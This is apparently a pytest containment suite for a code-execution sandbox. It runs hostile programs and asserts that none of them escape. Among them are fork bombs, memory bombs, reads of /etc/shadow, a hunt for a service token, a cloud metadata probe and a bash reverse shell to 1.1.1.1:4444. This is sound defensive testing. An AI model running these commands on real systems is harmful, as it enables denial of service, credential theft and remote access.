"""AC13: hostile code is contained, bounded and cannot starve the next run.

Each program attempts an escape and prints ``ESCAPED:<what>`` if it worked. Every test
uses ``healthy_after``: a normal run in every language must be correct right afterwards.
"""

from __future__ import annotations

import asyncio
import os
import socket

import pytest

from agentguard_sandbox.runner import Runner
from tests.sandbox.conftest import SERVICE_TOKEN, assert_healthy, run

pytestmark = pytest.mark.usefixtures("healthy_after")

FAST = {"cpu_s": 2, "wall_s": 3}


# Processes


@pytest.mark.parametrize(
    ("language", "code"),
    [
        (
            "python",
            "import os\nwhile True:\n    try:\n        os.fork()\n    except OSError:\n        pass\n",
        ),
        ("bash", "f() { f | f & }; f\nwait\n"),
        (
            "node",
            "const {spawn}=require('child_process');setInterval(()=>{try{spawn('/bin/sleep',['30'])}catch(e){}},1)",
        ),
    ],
)
async def test_fork_bombs_stop_at_the_process_limit(
    runner: Runner, language: str, code: str
) -> None:
    result = await run(runner, language, code, limits={**FAST, "pids": 16})
    assert result.verdict in ("timeout", "killed", "nonzero_exit", "ok", "memory"), result
    assert result.wall_ms < 8000, result


async def test_threads_stop_at_the_process_limit(runner: Runner) -> None:
    code = (
        "import threading, time\nstarted = 0\ntry:\n    for _ in range(10000):\n"
        "        threading.Thread(target=time.sleep, args=(5,), daemon=True).start()\n"
        "        started += 1\nexcept RuntimeError:\n    pass\n"
        "print('ESCAPED:threads' if started > 16 else 'done', started)\n"
    )
    result = await run(runner, "python", code, limits={**FAST, "pids": 16})
    assert "ESCAPED" not in result.stdout, result
    assert result.stdout.startswith("done"), result


async def test_a_fork_bomb_does_not_starve_a_concurrent_run(runner: Runner) -> None:
    bomb = run(
        runner,
        "python",
        "import os\nwhile True:\n    try:\n        os.fork()\n    except OSError:\n        pass\n",
        limits={**FAST, "pids": 64},
    )
    memory = run(
        runner,
        "python",
        "x = []\nwhile True:\n    x.append(bytearray(1 << 20))\n",
        limits={"cpu_s": 8, "wall_s": 10},
    )
    normal = run(
        runner,
        "python",
        "import sys\nprint(sum(map(int, sys.stdin.read().split())))\n",
        stdin="40 2",
    )
    bomb_result, memory_result, normal_result = await asyncio.gather(bomb, memory, normal)
    assert normal_result.verdict == "ok", normal_result
    assert normal_result.stdout.strip() == "42"
    assert memory_result.verdict == "memory", memory_result
    # A child that cannot fork may also fail to allocate its traceback (MemoryError).
    assert bomb_result.verdict in ("timeout", "killed", "nonzero_exit", "ok", "memory"), bomb_result


async def test_killing_everything_kills_only_the_sandbox(runner: Runner) -> None:
    result = await run(runner, "bash", "kill -9 -1\necho done\n")
    assert result.verdict in ("ok", "killed", "nonzero_exit"), result
    # This process (the service) is alive, and so is everything else outside the sandbox.
    os.kill(os.getpid(), 0)


# Memory, CPU, wall clock, output


@pytest.mark.parametrize(
    ("language", "code"),
    [
        ("python", "x = []\nwhile True:\n    x.append(bytearray(1 << 20))\n"),
        ("python", "b = bytearray(10 ** 10)\n"),
        ("node", "const a=[];for(;;)a.push(new Array(1e6).fill(1.5))"),
        ("node", "const a=[];for(;;)a.push(Buffer.alloc(64<<20,1))"),
        ("bash", "x=aaaaaaaaaaaaaaaa\nwhile true; do x=$x$x; done\n"),
    ],
)
async def test_memory_bombs_are_a_memory_verdict(runner: Runner, language: str, code: str) -> None:
    result = await run(
        runner, language, code, limits={**FAST, "memory_mb": 128, "wall_s": 10, "cpu_s": 8}
    )
    assert result.verdict == "memory", result
    # Bounded: well below the container, near the limit plus the runtime's reservation.
    assert result.memory_kb < (128 + 2048) * 1024, result


async def test_a_cpu_spin_is_a_timeout(runner: Runner) -> None:
    result = await run(
        runner, "python", "while True:\n    pass\n", limits={"cpu_s": 1, "wall_s": 10}
    )
    assert result.verdict == "timeout", result
    assert 900 <= result.cpu_ms <= 3500, result
    assert result.wall_ms < 6000, result


async def test_a_sleeper_is_stopped_at_the_wall_clock(runner: Runner) -> None:
    result = await run(runner, "bash", "sleep 100\n", limits={"cpu_s": 1, "wall_s": 1.5})
    assert result.verdict == "timeout", result
    assert result.detail == "wall clock limit reached"
    assert 1400 <= result.wall_ms < 5000, result


async def test_a_program_blocked_on_stdin_is_stopped(runner: Runner) -> None:
    result = await run(
        runner,
        "python",
        "import sys, time\nsys.stdin.read()\ntime.sleep(60)\n",
        limits={"wall_s": 1},
    )
    assert result.verdict == "timeout", result


@pytest.mark.parametrize("stream", ["stdout", "stderr"])
async def test_huge_output_is_cut_at_the_limit(runner: Runner, stream: str) -> None:
    code = f"import sys\nline = 'x' * 1000 + '\\n'\nwhile True:\n    sys.{stream}.write(line)\n"
    result = await run(runner, "python", code, limits={"output_bytes": 100_000, "wall_s": 10})
    assert result.verdict == "output_limit", result
    assert getattr(result, f"{stream}_truncated") is True
    assert len(getattr(result, stream)) == 100_000
    assert result.wall_ms < 5000, result


async def test_a_file_cannot_grow_past_file_bytes(runner: Runner) -> None:
    result = await run(
        runner,
        "bash",
        "head -c 50000000 /dev/zero > big\necho done\n",
        limits={"file_bytes": 2 << 20},
    )
    assert result.verdict in ("output_limit", "nonzero_exit", "ok"), result
    check = await run(
        runner,
        "python",
        "f = open('big', 'wb')\ntry:\n    f.write(b'x' * 50_000_000)\n    print('ESCAPED:big file')\n"
        "except OSError as e:\n    print('refused', e.errno)\n",
        limits={"file_bytes": 2 << 20},
    )
    assert "ESCAPED" not in check.stdout, check
    assert "refused 27" in check.stdout, check  # EFBIG


async def test_the_scratch_directory_is_bounded(runner: Runner) -> None:
    code = (
        "chunk = b'x' * (1 << 20)\nwritten = 0\ntry:\n    for i in range(2000):\n"
        "        with open(f'f{i}', 'wb') as f:\n            f.write(chunk)\n        written += 1\n"
        "except OSError as e:\n    print('stopped', e.errno, written)\nelse:\n    print('ESCAPED:unbounded scratch')\n"
    )
    result = await run(runner, "python", code, limits={"file_bytes": 4 << 20, "wall_s": 20})
    assert "ESCAPED" not in result.stdout, result
    assert result.stdout.startswith("stopped 28"), result  # ENOSPC
    assert int(result.stdout.split()[-1]) < 64


# File system


async def test_writing_outside_scratch_fails(runner: Runner) -> None:
    code = (
        "import os\n"
        "for path in ('/usr/pwned', '/bin/pwned', '/etc/pwned', '/pwned', '/sandbox/in/pwned',\n"
        "             '/sandbox/in/main.py', '/usr/local/bin/python3', '/dev/pwned', '/run/pwned'):\n"
        "    try:\n"
        "        with open(path, 'a') as f:\n"
        "            f.write('x')\n"
        "        print('ESCAPED:wrote', path)\n"
        "    except OSError:\n"
        "        pass\n"
        "for d in ('/usr/x', '/etc/x', '/opt'):\n"
        "    try:\n"
        "        os.mkdir(d)\n"
        "        print('ESCAPED:mkdir', d)\n"
        "    except OSError:\n"
        "        pass\n"
        "open('/tmp/work/ok', 'w').write('fine')\n"
        "print('done')\n"
    )
    result = await run(runner, "python", code)
    assert "ESCAPED" not in result.stdout, result
    assert result.stdout.strip() == "done", result


async def test_host_and_service_files_are_invisible(runner: Runner, settings: object) -> None:
    code = (
        "import glob, os\n"
        "found = [p for pat in ('/etc/shadow', '/etc/passwd', '/etc/hostname', '/etc/hosts',\n"
        "    '/opt/**', '/root/**', '/home/**', '/proc/**', '/sys/**', '/run/secrets/**',\n"
        "    '/var/**', '/tmp/agentguard-sandbox*/**', '/usr/local/lib/python3.12/site-packages/agentguard*',\n"
        "    '/**/agentguard_sandbox', '/**/nsjail.log', '/**/usage', '/src/**')\n"
        "    for p in glob.glob(pat, recursive=True)]\n"
        "if found:\n"
        "    print('ESCAPED:saw', found[:5])\n"
        "print(sorted(os.listdir('/')), sorted(os.listdir('/etc')))\n"
    )
    result = await run(runner, "python", code)
    assert "ESCAPED" not in result.stdout, result
    assert (
        result.stdout.strip()
        == "['bin', 'dev', 'etc', 'lib', 'sandbox', 'tmp', 'usr'] ['alternatives', 'ld.so.cache', 'ssl']"
    ), result


async def test_the_service_token_is_nowhere_in_reach(runner: Runner) -> None:
    assert os.environ["SANDBOX_TOKEN"] == SERVICE_TOKEN
    code = (
        "import os, sys\n"
        "needle = sys.stdin.read().strip().encode()\n"
        "if any(needle in (k + '=' + v).encode() for k, v in os.environ.items()):\n"
        "    print('ESCAPED:env')\n"
        "for root, dirs, files in os.walk('/'):\n"
        "    if root.startswith(('/usr', '/lib', '/bin', '/dev')):\n"
        "        dirs[:] = []\n"
        "        continue\n"
        "    for name in files:\n"
        "        try:\n"
        "            if needle in open(os.path.join(root, name), 'rb').read(10_000_000):\n"
        "                print('ESCAPED:file', os.path.join(root, name))\n"
        "        except OSError:\n"
        "            pass\n"
        "print('done')\n"
    )
    result = await run(runner, "python", code, stdin=SERVICE_TOKEN)
    assert "ESCAPED" not in result.stdout, result
    assert result.stdout.strip() == "done", result


# Syscalls and shells


async def test_namespace_mount_and_ptrace_calls_are_refused(runner: Runner) -> None:
    code = (
        "import ctypes\nlibc = ctypes.CDLL(None, use_errno=True)\n"
        "CLONE_NEWUSER, CLONE_NEWNET = 0x10000000, 0x40000000\n"
        "if libc.unshare(CLONE_NEWUSER) == 0:\n    print('ESCAPED:unshare user')\n"
        "if libc.unshare(CLONE_NEWNET) == 0:\n    print('ESCAPED:unshare net')\n"
        "if libc.ptrace(0, 0, 0, 0) == 0:\n    print('ESCAPED:ptrace')\n"
        "if libc.mount(b'none', b'/tmp', b'tmpfs', 0, None) == 0:\n    print('ESCAPED:mount')\n"
        "if libc.chroot(b'/tmp') == 0:\n    print('ESCAPED:chroot')\n"
        "if libc.setuid(0) == 0:\n    print('ESCAPED:setuid')\n"
        "print('done')\n"
    )
    result = await run(runner, "python", code)
    assert "ESCAPED" not in result.stdout, result
    assert result.stdout.strip() == "done", result


async def test_a_spawned_shell_is_still_inside_the_sandbox(runner: Runner) -> None:
    code = (
        "import subprocess\n"
        "out = subprocess.run(['/bin/sh', '-c', 'id; cat /etc/shadow; ls /opt; ls /proc;"
        ' bash -c "echo >/dev/tcp/169.254.169.254/80"; echo shell-ran\'],'
        " capture_output=True, text=True)\n"
        "print(out.stdout)\n"
        "print(out.stderr)\n"
    )
    result = await run(runner, "python", code)
    assert result.verdict == "ok", result
    assert "uid=65534" in result.stdout
    assert "shell-ran" in result.stdout
    assert "root:" not in result.stdout
    assert "No such file or directory" in result.stdout


async def test_bash_reverse_shell_cannot_connect(runner: Runner) -> None:
    result = await run(runner, "bash", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\necho exit=$?\n")
    assert "exit=1" in result.stdout, result


# Network (mode none)


async def test_mode_none_reaches_nothing(runner: Runner) -> None:
    # A listener in the service's own network namespace, which the program must not reach.
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("127.0.0.1", 0))
    listener.listen()
    abstract = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    abstract.bind("\0agentguard-sandbox-test")
    abstract.listen()
    port = listener.getsockname()[1]
    try:
        code = (
            "import socket, sys\n"
            f"targets = [('169.254.169.254', 80), ('1.1.1.1', 53), ('127.0.0.1', {port}),\n"
            "           ('10.0.0.1', 5432), ('172.17.0.1', 6379), ('8.8.8.8', 443)]\n"
            "for host, port in targets:\n"
            "    try:\n"
            "        socket.create_connection((host, port), timeout=1)\n"
            "        print('ESCAPED:tcp', host, port)\n"
            "    except OSError:\n"
            "        pass\n"
            "try:\n"
            "    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
            "    s.sendto(b'x', ('1.1.1.1', 53))\n"
            "    print('ESCAPED:udp')\n"
            "except OSError:\n"
            "    pass\n"
            "try:\n"
            "    socket.getaddrinfo('example.com', 80)\n"
            "    print('ESCAPED:dns')\n"
            "except OSError:\n"
            "    pass\n"
            "try:\n"
            "    u = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n"
            "    u.connect('\\0agentguard-sandbox-test')\n"
            "    print('ESCAPED:abstract unix socket')\n"
            "except OSError:\n"
            "    pass\n"
            # The kernel creates its tunnel placeholders in every namespace; none is up.
            "import fcntl, struct\n"
            "probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
            "for _, name in socket.if_nameindex():\n"
            "    req = struct.pack('16sH14s', name.encode(), 0, b'')\n"
            "    flags = struct.unpack('16sH14s', fcntl.ioctl(probe, 0x8913, req))[1]\n"
            "    if flags & 1:\n"
            "        print('ESCAPED:interface up', name)\n"
            "print('done')\n"
        )
        result = await run(runner, "python", code)
    finally:
        listener.close()
        abstract.close()
    assert "ESCAPED" not in result.stdout, result
    assert result.stdout.strip() == "done", result


async def test_the_service_survives_a_burst_of_hostile_runs(runner: Runner) -> None:
    hostile = [
        (
            "python",
            "import os\nwhile True:\n    try:\n        os.fork()\n    except OSError:\n        pass\n",
        ),
        ("python", "while True:\n    pass\n"),
        ("python", "import sys\nwhile True:\n    sys.stdout.write('y' * 4096)\n"),
        ("node", "const a=[];for(;;)a.push(Buffer.alloc(64<<20,1))"),
        ("bash", "sleep 60\n"),
        ("bash", "f() { f | f & }; f\nwait\n"),
    ]
    results = await asyncio.gather(
        *(
            run(
                runner,
                lang,
                code,
                limits={"cpu_s": 1, "wall_s": 2, "output_bytes": 50_000, "pids": 16},
            )
            for lang, code in hostile
        )
    )
    for (language, _), result in zip(hostile, results, strict=True):
        assert result.verdict != "error", (language, result)
        assert result.wall_ms < 8000, (language, result)
    await assert_healthy(runner)
